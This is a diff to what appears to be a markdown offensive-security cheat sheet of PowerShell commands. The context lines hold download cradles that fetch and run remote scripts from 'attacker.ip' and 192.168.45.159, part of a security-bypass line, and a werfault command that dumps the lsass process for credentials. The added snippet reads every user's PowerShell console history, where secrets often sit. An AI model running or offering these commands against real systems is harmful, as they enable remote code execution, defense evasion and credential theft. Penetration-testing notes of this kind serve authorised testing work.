@@ -26,6 +26,7 @@ $g=$f.SetValue($null,$true)
 ```powershell
 (New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/IM.ps1') | IEX
 ```
+
 - Download example
 ```powershell
 iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘http://attacker.ip/ASBB.ps1')”
@@ -118,3 +119,8 @@ Start-Process -FilePath "werfault.exe" -ArgumentList "/dump $($lsass.Id) $dumpPa
 &{IEX(New-Object Net.WebClient).downloadString('http://192.168.45.159:8000/ps/shell.ps1')}
 ```
 
+### Search for Powershell Command History for
+```powershell
+Get-ChildItem "C:\Users" -Directory | ForEach-Object { $h = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if (Test-Path $h) { Get-Content $h | ForEach-Object { "$($_.Name): $_" } } }
+
+```
